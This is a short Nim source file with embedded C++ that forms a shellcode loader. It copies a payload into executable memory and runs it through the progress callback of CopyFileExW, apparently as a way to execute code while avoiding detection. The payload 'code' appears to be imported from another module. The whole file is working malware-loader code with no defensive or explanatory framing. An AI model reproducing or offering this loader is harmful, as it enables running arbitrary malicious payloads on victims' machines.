import public

{.emit: """

int CopyEx(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
    return 1;
}
"""
.}

proc CopyEx(plainBuffer:cstring,size:cint):cint {.importcpp:"CopyEx(@)",nodecl.}

discard CopyEx(code,codelen)